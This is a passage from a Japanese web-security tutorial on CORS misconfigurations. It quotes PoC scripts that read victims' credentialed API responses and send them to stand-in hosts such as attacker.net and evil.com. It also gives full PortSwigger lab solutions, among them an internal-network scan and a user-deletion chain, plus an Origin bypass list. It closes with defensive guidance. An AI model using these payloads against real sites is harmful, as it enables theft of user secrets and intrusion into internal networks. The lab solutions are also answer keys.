* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
```

診断の第一歩は「攻撃者Originを送って、それがACAOに反射され、かつACACが `true` で返ってくるか」を確かめることである。手早いテストは次のとおり（six2dez 逐語）。

```bash
# Simple test
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
```

レスポンスヘッダに `Access-Control-Allow-Origin: http://evil.com` と `Access-Control-Allow-Credentials: true` の両方が出れば、Origin反射の脆弱性が強く疑われる。

### 8-2. パターン1: Origin Reflection（オリジン反射）

もっとも典型的な設定ミスが、**送られてきたOriginをそのままACAOに反射する**実装である。脆弱な実装は次のようになる（逐語）。

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

`Origin: https://evil.com` を送っただけで、ACAOに `https://evil.com` が反射され、ACACも `true` になっている。これで攻撃者オリジンのスクリプトが、被害者のCookie付きで機密を読める。

攻撃者が `evil.com` にホストするPoCは次のとおり（逐語）。

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

ボタン起動型のHTML版は次のとおり（逐語）。

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

`req.withCredentials = true`（または `xhr.withCredentials = true`）が肝である。これで被害者のCookieが付いたリクエストが飛び、`reqListener` で受け取ったレスポンス本文（機密）を `attacker.net/log` に送っている。

### 8-3. パターン2: Null Origin（null originの信頼）

サーバーが `Origin: null` を信頼している場合の脆弱な実装は次のとおり（逐語）。

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

攻撃者は `data:` URI スキームの sandbox iframe を使って `Origin: null` を発生させる。PoCは次のとおり（逐語）。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

`sandbox` 属性付きで `allow-same-origin` を含めていないため、この iframe 内のドキュメントは opaque origin になり、リクエストの `Origin` が `null` になる。第6・7小節で見たとおり、null は資格情報付きでも許可されるため、この設定ミスは反射と同じく危険である。

### 8-4. パターン3: XSS on Trusted Origin（信頼済みオリジン上のXSSを踏み台に）

許可リストが厳密で、反射も null も効かない場合でも、**許可されたオリジン上にXSSがあれば**、そのXSSに上記のCORSペイロードを注入して同じ窃取ができる。

```powershell
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

信頼オリジン上でスクリプトを実行できてしまえば、そのスクリプトは正当な許可オリジンとして機密APIを読める。これは「CORS防御は信頼オリジンの安全性に依存する」ことを示す。だからサブドメインのXSSを潰すことがCORS防御の一部になる。

### 8-5. パターン4: Wildcard Origin without Credentials（`*` + 認証不要 → 内部pivot）

`Access-Control-Allow-Origin: *` のとき、ブラウザはCookieを送らない。しかし**認証が不要なサーバーなら、中身は読める**。この性質を使うと、インターネットから直接到達できない**内部サーバーへ、被害者のブラウザを踏み台にpivot（横移動）**できる。

なお、ワイルドカードとして使えるのは `*` だけである（逐語）。

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

脆弱な実装は次のとおり（逐語）。

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

PoCは、`withCredentials` が不要な点に注意（逐語）。

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

`api.internal.example.com` は本来インターネットから見えない内部APIだが、被害者のブラウザは内部ネットワークにいるため、その被害者のブラウザにこのスクリプトを実行させれば内部APIを読める。

### 8-6. パターン5: Expanding the Origin（許可判定の不備・正規表現ミス）

サーバーの許可オリジン照合が甘い（前方一致だけ、ドットが未エスケープなど）と、攻撃者のドメインが許可されてしまう。代表例が2つある。

**例1: 任意の接頭辞（prefix）が許される。** `example.com` の前に何を付けても通る実装（逐語）。

```powershell
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`evilexample.com` にホスト、逐語）。

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

**例2: 正規表現のドット未エスケープ。** `^api.example.com$`（正しくは `^api\.example.com$`）だと、`.` が任意の1文字にマッチしてしまい、`apiiexample.com` のような別ドメインが通る（逐語）。

```powershell
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`apiiexample.com` にホスト、逐語）。

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

〔補足〕Origin検証バイパスで試すべき変異パターンは、末尾に許可ドメインを含める（`evil.com` と `evil-target.com` と `target.com.evil.com`）、`null`、サブドメイン（`sub.attackertarget.com`）、ドット除去（`attackertarget.com`）、`https` / `http` の両方、`Origin` の大小・末尾スラッシュ・ポート付与などである（詳しくは第10小節のバイパス変異リスト）。

---

## 9. PortSwigger CORS ラボ 4本の詳細解法

PortSwigger の CORS トピックには全4ラボがある。PayloadsAllTheThings が挙げるラボ一覧（逐語）は次のとおり。

```
* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
```

各ラボの難易度は、ラボ①basic origin reflection = APPRENTICE、ラボ②trusted null origin = APPRENTICE、ラボ③trusted insecure protocols = PRACTITIONER、ラボ④internal network pivot = EXPERT である。

### 9-1. ラボ① basic origin reflection（APPRENTICE）

ラボ設定は「全オリジンを信頼する（Originを反射する）不適切なCORS設定」。既知クレデンシャルは `wiener:peter`。ゴールは管理者APIキーを取得し、exploitサーバへ送るJSを作ることである。

手順（walk-through要約）は次のとおり。

1. `wiener:peter` でログインする。`/my-account` が `/accountDetails` へのAJAXでAPIキーを取得しているのが分かる。
2. `/accountDetails` の応答に `Access-Control-Allow-Credentials` ヘッダがある。これはCORS対応の兆候。Repeaterで `Origin` ヘッダを付けて挙動を見る。
3. **送ったOriginが `Access-Control-Allow-Origin` にそのまま反射される**。つまり任意オリジンに読み取り許可が出ている。
4. exploitサーバに以下を置き、被害者に配信する。ログにAPIキーが出る。

PortSwigger公式解法の exploit HTML（six2dez 逐語、`$url` は自分のラボURLに置換）。

```
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

`psw` walk-through 版の exploit（2リクエスト目でexploitサーバへ送出。逐語）。

```
<script>
    var r = new XMLHttpRequest();
    r.open('get', "<host>/accountDetails", false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    var r2 = new XMLHttpRequest();
    r.open('get', "<exploit_server>/?user=" + obj.username + '&apikey=' + obj.apikey, false)
    r.send();
</script>
```

ログ行の形式は次のとおり（逐語）。ここから `apikey` を抽出する。

```
172.31.30.227   2022-05-01 16:53:37 +0000 "GET /?user=administrator&apikey=gOl7iVmfoesIVlIsWUfK30vYkLUDcRXr HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
```

### 9-2. ラボ② trusted null origin（APPRENTICE）

ラボ設定は「`null` origin を信頼するCORS設定」。`wiener:peter`。

手順（walk-through要約）は次のとおり。

1. ログインして `/accountDetails` を確認する。応答に `Access-Control-Allow-Credentials` がある。
2. Repeaterで通常のOrigin反射を試すが、**反射されない**（ラボ①と違う）。
3. ワイルドカードを考えるが、`*` ではCookieが送られないので資格情報付き窃取には使えない。
4. **`Origin: null`** を送ると `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` が返る。null信頼が確認できる。
5. null origin を発生させるため sandbox iframe（または data URI）を使う。

PortSwigger公式解法の exploit（six2dez 逐語、`$url` / `$exploit-server-url` を置換）。

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe>
```

`psw` walk-through 版（`srcdoc` の sandbox iframe を使い、URLの引用符を `'` に変える工夫。逐語）。

```
<iframe name="malicious" srcdoc="<script>
    var r = new XMLHttpRequest();
    r.open('get', \'<host>/accountDetails', false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    r.open('get', \'<exploit_server>/?user=' + obj.username + '&apikey=' + obj.apikey, false);
    r.send();
</script>" sandbox="allow-scripts" width="0px" height="0px" style="border: 0px none;"> </iframe>
```

〔補足〕walk-throughのコメント「In difference to the previous lab the URLs need to use ' instead of " as the " are used for the iframe.」とは、iframe属性の `"` と衝突するため、内部のURLは `'` にする、という意味である。

### 9-3. ラボ③ trusted insecure protocols（PRACTITIONER）

ラボ設定は「プロトコルに関係なく全サブドメインを信頼する」不適切なCORS設定（HTTPのサブドメインも信頼する）。`wiener:peter`。

手順（walk-through要約）は次のとおり。

1. ログインして `/accountDetails` でAPIキー取得を確認する。
2. exploitサーバから直接 `/accountDetails` を読もうとすると、応答に `Access-Control-Allow-Origin` が付かず、ブラウザがブロックする（exploitサーバは信頼オリジンではない）。
3. `Origin: http://subdomain.<lab-id>` を送ると反射される。つまり任意のサブドメイン（HTTP含む）を許可している。
4. サブドメイン `stock.<lab-id>` の `productId` パラメータにXSSがある（HTTPで読み込まれる在庫確認ページ）。
5. **XSS経由で信頼サブドメイン上にCORS窃取スクリプトを実行**し、`/accountDetails` を読む。

`stock` サブドメインのXSS確認URL（walk-through 逐語）。

```
https://stock.ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/?productId=1%3Cscript%3Ealert(document.domain);%3C/script%3E&storeId=1
```

最終exploit（`psw` walk-through、逐語。`document.location` で信頼サブドメインへ飛ばしてXSSで実行する。内側の `</script>` は `%3c`、`+` は `%2b`、`&` は `%26` でURLエンコードしている）。

```HTML
<script>
	document.location="https://stock.ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/?productId=1<script>var r = new XMLHttpRequest(); r.open('get','https://ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/accountDetails',false); r.withCredentials = true; r.send(); const obj=JSON.parse(r.responseText);r.open('get','https://exploit-ac921f151fca5facc0394693015700d9.web-security-academy.net/?user='%2bobj.username%2b'%26apikey='%2bobj.apikey, false); r.send();%3c/script>&storeId=1"
</script>
```

PortSwigger公式解法版（six2dez 逐語、`$your-lab-url` / `$exploit-server-url` を置換）。

```
<script>
   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

〔補足〕walk-throughの注意点（逐語要旨）は次のとおり。

- exploitサーバは信頼オリジンではないので、`document.location` で**信頼サブドメイン（`stock...`）へ遷移させ**、そこのXSSでペイロードを実行する。信頼ドメインだからこそブラウザが `/accountDetails` の読み取りを許す。
- `document.location` のURL中の内側の `</script>` の `<` をURLエンコードしないと、ブラウザが最初の `</script>` でスクリプトを閉じてしまう。
- exploitサーバへの要求の `+` と `&` もURLエンコードしないと、`stock...` への要求のパラメータと解釈されてしまう。

### 9-4. ラボ④ internal network pivot（EXPERT）

ラボ設定は、内部ネットワークのエンドポイントに対する多段pivot。被害者のブラウザを踏み台にして内部の管理ページを操作し、最終的にユーザー `carlos` を削除すればクリアである。全4ステップからなる。このラボは他ラボにない内部pivotコードを含むので、特に価値が高い。PortSwigger公式解法のJSを逐語で示す。

**Step 1** ― 内部ネットワーク（`192.168.0.0/24` の `:8080`）をスキャンしてエンドポイントを発見する。`$collaboratorPayload` を自分のCollaboratorペイロード/exploitサーバURLに置換し、Collaborator/ログの `code` パラメータを確認する（逐語）。

```
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```

**Step 2** ― 発見した内部IP（`$ip`）の `username` フィールドのXSSを探る。成功すると `foundXSS=1` がCollaborator/ログに出る（逐語）。

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

**Step 3** ― 発見したXSSで `/admin` ページのソースを窃取する（逐語）。

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

**Step 4** ― Step3で得た `/admin` のフォームを使い、iframe注入で `carlos` を削除する（逐語）。

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  }
  ))
}

fetchUrl("http://$ip");
</script>
```

〔補足〕このラボは「CORSでワイルドカード等が緩いと、被害者のブラウザ経由で本来到達不能な**内部ネットワークをスキャン → XSS発見 → 管理操作**まで多段でpivotできる」ことを示す。防御は、内部サービスでもOrigin検証を厳格化し、`*` を返さず、認証を必須にすることである。

---

## 10. CORS検出ツールと JSONP / Origin バイパス変異

### 10-1. CORS検出ツール

PayloadsAllTheThings のツール一覧（逐語）は次のとおり。

```
* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
```

six2dez のツール実行例（逐語）は次のとおり。

```bash
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com
# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com
# https://github.com/Shivangx01b/CorsMe
echo "https://example.com" | ./Corsme 
cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
cat http_https.txt | ./CorsMe -t 70
# CORSPoc
# https://tools.honoki.net/cors.html
```

### 10-2. JSONP という別経路

**JSONP（JSON with Padding）とは、CORS以前からある、クロスオリジンでデータを取得する古い手法のこと**。`callback` パラメータでコールバック関数名を渡すと、サーバーが `関数名(JSONデータ)` の形で返す。`<script>` タグは別オリジンから読めるので、これでクロスオリジンのデータを取得していた。認証付きのJSONPエンドポイントは情報漏洩源になりうる。

```
# JSONP
In GET URL append “?callback=testjsonp”
Response should be:
testjsonp(<json-data>)
```

### 10-3. Origin バイパス変異リスト

Origin検証のバイパスで試す変異は次のとおり（逐語）。

```
# Bypasses
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
```

〔補足〕このリストの狙いは、`null`（null信頼の確認）、無関係ドメイン（反射の確認）、`attacker.target.com`（サブドメイン許可の悪用）、`attackertarget.com`（ドット除去＝接尾辞/正規表現ミスの確認）、`sub.attackertarget.com`（多段サブドメイン）である。実務ではさらに `target.com.attacker.com`（接尾辞一致の悪用）、`attacker-target.com`、大文字小文字の違い、末尾スラッシュ、ポート付き、scheme違い（http / https）も試す。

---

## 11. PoC テンプレート集（検証用の雛形）

以下は six2dez が示す、そのまま検証に使える雛形である（逐語）。許可された検証環境でのみ使うこと。

**CORS PoC（GETで機密を画面表示する）**

```
<!DOCTYPE html>
<html>
<head>
<title>CORS PoC Exploit</title>
</head>
<body>
<center>

<h1>CORS Exploit<br>six2dez</h1>
<hr>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script type="text/javascript">
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
 xhttp.open("GET", "http://<vulnerable-url>", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
</script>

</center>
</body>
</html>
```

**CORS PoC 2（POST）**

```
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

</script>
</html>
```

**CORS PoC 3 ― Sensitive Data Leakage（機密を読み取り攻撃者サーバへPOSTする）**

```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='corspoc'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from target1337.com about user account
document.getElementById("corspoc").innerHTML = a;
xhttp.open("POST", "https://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("POST", "https://target1337.com", true);
xhttp.withCredentials = true;
var body = "requestcontent";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhttp.send(new Blob([aBody]));
}
</script>
</body>
</html>
```

**CORS JSON PoC（JSONP窃取）**

```
<!DOCTYPE html>
<html>
<head>
<title>JSONP PoC</title>
</head>
<body>
<center>

<h1>JSONP Exploit<br>YourTitle</h1>
<hr>
<div id="demo">
<button type="button" onclick="trigger()">Exploit</button>
</div>
<script>

function testjsonp(myObj) {
  var result = JSON.stringify(myObj)
  document.getElementById("demo").innerHTML = result;
  //console.log(myObj)
}

</script>

<script >

  function trigger() {
    var s = document.createElement("script");
    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
    document.body.appendChild(s);
}

</script>
</body>
</html>
```

---

## 12. 防御・修正の要点

ここまで攻撃を見てきたが、診断の目的は塞ぐことにある。CORS脆弱性の防御の要点は次のとおり（PortSwigger の方針とMDNの記述に整合する）。

1. **Originを反射しない**。許可オリジンの**厳密な許可リスト（完全一致）**で照合する。
2. **`null` を信頼リストに入れない**（`Access-Control-Allow-Origin: null` を返さない）。sandbox iframe / data URI / リダイレクトで容易に偽装される。
3. **機密APIに `Access-Control-Allow-Origin: *` を使わない**。内部サービスも同様（pivot対策）。`*` と資格情報は併用不可という仕様も理解しておく。
4. **正規表現で照合するなら `.` を `\.` でエスケープ**し、前方一致・部分一致ではなくアンカー（`^` と `$`）で完全一致させる。
5. **動的にACAOを返すなら `Vary: Origin` を必ず付与**する（キャッシュ汚染防止）。
6. **`Access-Control-Allow-Credentials: true` は本当に必要な場合だけ**にする。資格情報が不要なら、Cookieに依存しない設計にする。
7. **HTTP等の安全でないプロトコル/サブドメインを信頼しない**。サブドメインのXSSがそのままCORS窃取に化ける。
8. **CORSは内部の認証・認可の代替ではない**。CORSで読めても、各エンドポイント自体の認可を厳格にする。
9. **サブドメインのXSSを潰す**。信頼オリジンが侵害されると、CORS防御は無意味になる。

MDN の防御の言い回しも整理しておく（逐語要約）。書き込みを防ぐには推測不能なCSRFトークンを検証し、そのトークンを要するページの読み取りも防ぐ。読み取りを防ぐにはリソースを埋め込み不可にする。埋め込みを防ぐにはリソースが埋め込み可能フォーマットとして解釈されないようにする（ブラウザは `Content-Type` を尊重しないことがある点に注意）。

---

## 13. サードパーティCookie / SameSite との相互作用（現代の成立条件）

CORS窃取PoCは古典的には `withCredentials = true` で被害者のCookieを付けて成立する。しかし現代のブラウザでは、この成立条件が狭まっている。ここを知らないと「攻撃できるはずなのに動かない」で混乱する。

MDN の注意（逐語要約）は次のとおり。

- クロスドメインへの credentialed（資格情報付き）リクエストには、**サーバ/クライアントの設定に関係なく、サードパーティCookieポリシーが常に適用される**。
- サードパーティCookieポリシーが third-party cookie の送信を止めると、`Access-Control-Allow-Credentials` でサーバが許可していても、**実質的に credentialed リクエストが成立しない**。既定はブラウザで異なり、**`SameSite` 属性**で制御される。
- ブラウザがサードパーティCookieを全拒否する設定なら、`Set-Cookie` も無効化される。

**SameSite とは、Cookieをクロスサイトのリクエストに付けてよいかを制御する属性のこと**。`SameSite=Lax` が多くのブラウザの既定になり、サードパーティCookie制限も進んだため、古典的なCORS credential窃取PoC（`withCredentials=true`）の成立条件は狭まっている。

〔含意〕診断のときは、標的Cookieの `SameSite` 値と、ブラウザのサードパーティCookie設定も考慮する必要がある。ただし、**同一サイト（same-site）内の別オリジン**間や、`SameSite=None; Secure` が付いたCookieでは、依然として成立しうる。だから「SameSiteがあるからCORS窃取はもう無理」と決めつけず、条件を1つずつ確認することが大切である。

なお、CORS診断で覚えておくべき性質がもう1つある。MDN によれば「CORS failures result in errors but for security reasons, specifics about the error are not available to JavaScript.」つまり**JavaScriptはCORSエラーの詳細を取れない**。コードが知れるのは「エラーが起きた」ことだけで、具体的に何が悪かったかはブラウザのDevToolsコンソールでしか判らない。診断ではコンソールを必ず開いておくこと。

---

## 手を動かす

以下は、自分で立てた検証環境か、明示的に許可された PortSwigger Web Security Academy のラボでのみ行うこと。

1. **オリジン判定を口で言えるようにする。** `http://normal-website.com/example/` を基準に、`https://normal-website.com/example/`、`http://en.normal-website.com/example/`、`http://normal-website.com:8080/example/` が同一オリジンか別オリジンかを、理由（scheme / host / port のどれが違うか）とともに紙に書く。第1小節の表と突き合わせて答え合わせをする。

2. **反射の有無を curl で確かめる。** 検証用に立てたサーバー（または許可された標的）に対して次を実行し、レスポンスヘッダを見る。

```bash
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
```

`Access-Control-Allow-Origin: http://evil.com` と `Access-Control-Allow-Credentials: true` の両方が返れば、Origin反射の脆弱性が強く疑われる。標的URLとOriginは自分の環境の値に置き換える。

3. **PortSwigger ラボ①（basic origin reflection）を解く。** `wiener:peter` でログインし、Burp Repeater で `/accountDetails` に `Origin: https://example.com` を付けて送り、ACAOに反射されることを確認する。次に exploit サーバへ第9-1小節の exploit HTML（`$url` を自分のラボURLに置換）を置き、「Deliver to victim」でログにAPIキーが出ることを確かめる。

4. **ラボ②（trusted null origin）を解く。** ラボ①との違い（Origin反射は効かないが `Origin: null` は信頼される）を Repeater で確認し、第9-2小節の sandbox iframe + data URI の exploit を使って null origin を発生させる。

5. **バイパス変異を試す。** 第10-3小節の変異リスト（`Origin:null`、`Origin:attackertarget.com` など）を Repeater の Intruder に流し込み、どのOriginがACAOに反射されるかを一覧化する。ドット除去（`attackertarget.com`）が通る場合は正規表現のドット未エスケープを疑う。

6. **DevToolsコンソールを読む。** CORSがブロックされたとき、JavaScriptからは詳細が取れない。ブラウザのDevToolsのコンソールを開き、実際のCORSエラーメッセージ（どのヘッダが足りないか）を確認する癖をつける。

7. **スキャナで一次スクリーニングする。** 許可された範囲で `python3 corsy.py -u https://example.com` を実行し、報告された設定ミス候補を手作業（Repeater）で必ず再確認する。ツールの出力は仮説であって確証ではない。

---

## つまずきポイント

- **「リクエストが飛んでいないから安全」と誤解する。** CORSがブロックするのは「JSがレスポンスを読むこと」だけで、リクエスト自体はネットワーク上で標的に到達し、`withCredentials` を付ければCookieも送られる。読めないだけで送信は起きている。
- **`Access-Control-Allow-Origin: *` を「一番危険」と思い込む。** `*` はブラウザがCookieを送らないので、認証付き機密の窃取には使えない。本当に危険なのは「攻撃者Originの反射」と「null信頼」（どちらも資格情報付きで読める）である。ただし `*` は認証不要の内部APIでは pivot に悪用されるので、無害ではない。
- **`*` と資格情報を併用できると勘違いする。** `Access-Control-Allow-Credentials: true` のときACAOに `*` は使えない。ブラウザが拒否する。具体的オリジンか `null` が必要。
- **null origin を「安全な既定」と思う。** null は「決して他と等しくならない」ための値だが、サーバーが `null` を許可リストに入れると、攻撃者が sandbox iframe / data URI で自作した null で読めてしまう。
- **正規表現のドットを素で書く。** `^api.example.com$` は `.` が任意1文字にマッチし、`apiiexample.com` を通してしまう。必ず `\.` でエスケープし、`^` と `$` でアンカーする。
- **`Vary: Origin` を忘れる。** 動的にACAOを返すのに `Vary: Origin` を付けないと、キャッシュがオリジン間で応答を使い回し、ポリシーが崩れる。
- **SameSite / サードパーティCookie制限を無視する。** 現代ブラウザでは `SameSite=Lax` 既定や3rd-party cookieブロックで、古典的な credentialed 窃取が成立しないことがある。標的Cookieの `SameSite` 値を確認する。
- **ラボ③のURLエンコードでハマる。** `document.location` のURL内の内側 `</script>` は `%3c` に、`+` は `%2b`、`&` は `%26` にエンコードしないと、スクリプトが途中で閉じたりパラメータが混線したりする。
- **`document.domain` を今使おうとする。** これは非推奨。sandbox iframe 内では `SecurityError` になり、多くのWeb APIのオリジンチェックにも効かない。文書間通信は `postMessage` か CORS を使う。

---

## この節のまとめ

- オリジンは **scheme + host + port** の3要素で決まり、1つでも違えば別オリジン。パスは無関係。
- 「オリジン」と「サイト（scheme + eTLD+1）」は別の粒度。CORS/SOPはオリジン単位、SameSite/サイト分離はサイト単位。
- SOPの核心は「クロスオリジンの**書き込み・埋め込みは許すが、レスポンスの読み取りは禁じる**」という非対称性にある。
- 読み取りは禁止でも、埋め込みを通じて情報（画像の寸法、リソースの存在有無など）が漏れることがある（XS-Leaksの土台）。
- SOPには例外があり、`window.location` はクロスオリジンでRead/Write可、`location.href` はWrite-only、`window.length`/`closed` はRead-only、`postMessage`/`close`/`blur`/`focus` は呼べる。
- `document.domain` はレガシーなSOP緩和で**非推奨**。文書間通信は `postMessage` か CORS を使う。
- CORSはSOPを**サーバー側がHTTPヘッダで明示的に緩める**仕組みで、`Access-Control-Allow-Origin`（ACAO）が「読み取りを許すオリジン」を指定する。
- CORSにはシンプルリクエスト（プリフライトなし）と、`OPTIONS` を伴うプリフライトがある。JSON送信・独自ヘッダ・`PUT`/`DELETE` などはプリフライトを発生させる。
- **資格情報付きの読み取りには `Access-Control-Allow-Credentials: true` が必要で、そのときACAOに `*` は使えない**（`null` は使える）。ここがCORS脆弱性理解の中心。
- 代表的な設定ミスは、Origin反射・null信頼・安全でないサブドメイン（HTTP）の信頼・不完全な正規表現によるバイパス・`*`による内部ネットワークpivot。
